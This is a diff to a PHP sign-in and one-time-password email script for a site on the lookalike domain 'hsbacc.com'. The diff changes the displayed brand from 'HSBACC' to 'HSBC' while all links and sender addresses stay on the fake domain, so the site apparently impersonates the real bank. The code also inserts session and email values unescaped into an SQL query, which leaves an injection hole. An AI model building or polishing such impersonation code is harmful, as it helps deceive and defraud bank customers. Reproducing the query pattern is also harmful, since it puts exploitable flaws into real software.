@@ -63,7 +63,7 @@ if(isset($_GET['suspended'])) {
     <?php
                       if(isset($_GET['sent'])) {
                           echo '<div class="alert" style="color: black; background-color: #fdc600;">
-  <strong>Application received!</strong> Thank you for choosing HSBC, we will review your application and respond within 0-2 business days.
+  <strong>Application received!</strong> Thank you for choosing HSBC.
 </div>
                         
                      ';
@@ -104,7 +104,7 @@ if(isset($_POST['signin_submit'])) { //IF LOGIN BTN HAS BEEN CLICKED
                     $headers  = 'MIME-Version: 1.0' . "\r\n";
                     $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
                     $message = '<html><body>';
-                    //$message = '<div class="navbar-brand"  style="text-align: center;" href=""><img src="https://i.ibb.co/SXJ2prp/logo-icon-170012.png" alt="hsbacc" class="logo">';
+                    $message = '<div class="navbar-brand" style="text-align: center;"><img src="https://i.ibb.co/SXJ2prp/logo-icon-170012.png" alt="hsbacc" style="width: 100px; height: 75px" class="logo">';
                     ;
                     $message .= '<div>';
                     $message .= '<h3 style="text-align: left; font-weight: normal;">Hi '. $first_name . '</h3>';
@@ -113,7 +113,7 @@ if(isset($_POST['signin_submit'])) { //IF LOGIN BTN HAS BEEN CLICKED
                     $message .= '<p style="color: red;">NB: Please do not discose to anyone</p>';
                     $message .= '<p>we will never ask you to share this code with anyone</p>';
                     $message .= '<p>Don’t recognise this activity? quickly email us at security@hsbacc.com</p>';
-                    $message .= '<div style="background-color: red; color: white;"><a href="https://www.hsbacc.com" style="color: white"><b>HSBACC!</b></a> More than just a bank. Get a little extra help from the <a href="https://www.hsbacc.com"><b>HSBACC</b></a>.</div>';
+                    $message .= '<div style="background-color: red; color: white;"><a href="https://www.hsbacc.com" style="color: white"><b>HSBC!</b></a> More than just a bank. Get a little extra help from the <a href="https://www.hsbacc.com"><b>HSBC</b></a>.</div>';
                     $message .= '</div></div></body></html>';
                     $headers .= 'From: '.$from."\r\n".
     'Reply-To: '.$from."\r\n" .
@@ -125,13 +125,13 @@ if(isset($_POST['signin_submit'])) { //IF LOGIN BTN HAS BEEN CLICKED
                     $ins_sql1 = "INSERT INTO otp (name, userid, email, code) VALUES ('$_SESSION[name]', '$_SESSION[id]', '$email', '$code')";
                     $run_sql2 = mysqli_query($conn, $ins_sql1);
                     $to = $_SESSION['email']; // this is your Email address
-                    $from = "security@hsbacc.com"; // this is the sender's Email address
+                    $from = "otp@hsbacc.com"; // this is the sender's Email address
                     $first_name = $_SESSION['name'];
                     $subject2 = "OTP Verification | Do not share [OTP: ".$code. "]";
                     $headers  = 'MIME-Version: 1.0' . "\r\n";
                     $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
                     $message = '<html><body>';
-                    // $message = '<div class="navbar-brand"  style="text-align: center;" href=""><img src="https://i.ibb.co/pK6BfqV/CDFBank-Logo-Original-5000x5000-2-3.png" alt="hsbacc" class="logo">';
+                    $message = '<div class="navbar-brand" style="text-align: center;"><img src="https://i.ibb.co/SXJ2prp/logo-icon-170012.png" alt="hsbacc" style="width: 100px; height: 75px" class="logo">';
                     $message .= '<div>';
                     $message .= '<h3 style="text-align: left;">Hi '. $first_name . '</h3>';
                     $message .= "<h4 style='color:#071d49;'>Your one time password is
@@ -140,7 +140,7 @@ if(isset($_POST['signin_submit'])) { //IF LOGIN BTN HAS BEEN CLICKED
                     $message .= '<p style="color: red;">NB: Please do not discose to anyone, We will never request for this code</p>';
                     $message .= '<p>we will never ask you to share this code with anyone</p>';
                     $message .= '<p>Don’t recognise this activity? quickly email us at security@hsbacc.com</p>';
-                    $message .= '<div style="background-color: red; color: white;"><a href="https://www.hsbacc.com" style="color: white"><b>HSBACC!</b></a> More than just a bank. Get a little extra help from the <a href="https://www.hsbacc.com"><b>HSBACC</b></a>.</div>';
+                    $message .= '<div style="background-color: red; color: white;"><a href="https://www.hsbacc.com" style="color: white"><b>HSBC!</b></a> More than just a bank. Get a little extra help from the <a href="https://www.hsbacc.com"><b>HSBC</b></a>.</div>';
                     $message .= '</div></div></body></html>';
                     $headers .= 'From: '.$from."\r\n".
     'Reply-To: '.$from."\r\n" .
